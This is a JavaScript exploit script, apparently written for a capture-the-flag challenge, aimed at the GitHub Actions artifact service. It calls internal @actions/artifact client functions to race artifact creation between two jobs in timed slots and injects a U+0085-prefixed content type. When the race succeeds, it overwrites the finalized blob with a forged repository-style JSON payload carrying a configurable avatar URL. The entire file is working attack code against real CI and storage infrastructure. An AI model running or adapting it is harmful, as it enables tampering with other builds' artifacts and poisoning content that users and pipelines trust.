// Draft for cross-job-action/index.mjs. Requires @actions/artifact and
// @azure/storage-blob installed at repository root. No tokens/SAS URLs logged.
import https from 'node:https';
import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const version = Number(process.env.CTF_VERSION);
if (![6, 7].includes(version)) throw new Error('Set CTF_VERSION to 6 or 7');
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const initial = Buffer.from('{"probe":"cross-job"}');
const digest = StringValue.create({value: `sha256:${createHash('sha256').update(initial).digest('hex')}`});
const portrait = process.env.PORTRAIT_URL ||
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/lqkAAAAASUVORK5CYII=';
const cp = s => Array.from(s || '', c => c.codePointAt(0));
const sleep = ms => new Promise(resolve => setTimeout(resolve, Math.max(0, ms)));

async function upload(url, body) {
  if (!url) return false;
  try {
    await new BlobClient(url).getBlockBlobClient().uploadData(body, {
      blobHTTPHeaders: {blobContentType: odd},
    });
    return true;
  } catch { return false; }
}
async function observedType(url) {
  if (!url) return '';
  return new Promise(resolve => {
    const req = https.get(url, {timeout: 12000}, res => {
      const value = res.statusCode === 200 ? res.headers['content-type'] || '' : '';
      res.resume();
      res.on('end', () => resolve(value));
    });
    req.on('timeout', () => req.destroy());
    req.on('error', () => resolve(''));
  });
}
async function attempt(slot) {
  // Both jobs use the same run ID and UTC slot, while their job IDs differ.
  const name = `ctf-cross-${process.env.GITHUB_RUN_ID}-${slot}`;
  let url = '';
  try {
    url = (await client.CreateArtifact({...ids, name, version,
      mimeType: StringValue.create({value: version === 6 ? odd : 'application/json'})})).signedUploadUrl;
  } catch {}
  const uploaded = await upload(url, initial);
  let id = '';
  if (url) {
    try { id = String((await client.FinalizeArtifact({...ids, name,
      size: String(initial.length), hash: digest})).artifactId); } catch {}
  }
  await sleep(1200);
  let signed = '';
  let rsct = '';
  try {
    signed = (await client.GetSignedArtifactURL({...ids, name})).signedUrl;
    rsct = new URL(signed).searchParams.get('rsct') || '';
  } catch {}
  const ct = rsct.includes('\u0085') ? await observedType(signed) : '';
  const sameBlob = Boolean(url && signed &&
    new URL(url).pathname === new URL(signed).pathname);
  const winner = Boolean(id && ct === odd);
  let carrierWritten = false;
  let repository = '';
  if (winner) {
    repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
    const body = Buffer.from(JSON.stringify({full_name: repository,
      owner: {login: 'cassette', avatar_url: portrait},
      description: 'Repo Cassette artifact', stargazers_count: 0}));
    carrierWritten = await upload(url, body);
  }
  console.log('CROSS', JSON.stringify({slot, version, created: Boolean(url),
    uploaded, finalized: Boolean(id), id, sameBlob, rsct: cp(rsct), ct: cp(ct),
    winner, carrierWritten, repository}));
  return winner;
}

const period = 8000;
const rounds = Math.max(1, Math.min(40, Number(process.env.RACE_ROUNDS || 20)));
let slot = Math.ceil((Date.now() + 2000) / period);
for (let i = 0; i < rounds; i++, slot++) {
  await sleep(slot * period - Date.now());
  if (await attempt(slot)) break;
}
